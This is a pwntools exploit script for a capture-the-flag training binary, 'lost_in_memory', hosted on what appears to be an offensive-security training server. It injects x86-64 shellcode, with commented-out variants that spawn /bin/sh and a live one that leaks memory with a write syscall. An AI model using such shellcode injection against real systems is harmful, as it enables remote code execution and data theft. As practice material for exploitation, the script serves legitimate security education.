from pwn import *


context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
	r = process("./lost_in_memory")
	gdb.attach(r, """
	brva 0xa20
	c
	""")
	input("wait")
else:
	r = remote("bin.training.offdef.it", 4001)


#shellcode = b"\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x89\xE7\x6A\x3B\x58\x99\x0F\x05" #shellcode no \x00
#shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF/bin/sh\x00" #shellcode yes \x00
shellcode = b"\xE8\x00\x00\x00\x00\x5E\x48\x83\xEE\x6c\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC2\x30\x00\x00\x00\x0F\x05" #write

#reset some registers before sending shellcode
payload = b"\x90"*2 + shellcode + b"\x90"
#payload = payload.ljust(512, b"\x90")

r.recvuntil(b"> ")
print("payload sent")
r.send(payload)
print("done")

print(r.recv()[0:45])
#print(r.recvuntil("flag{"))
#print(r.recvuntil("}"))

r.interactive()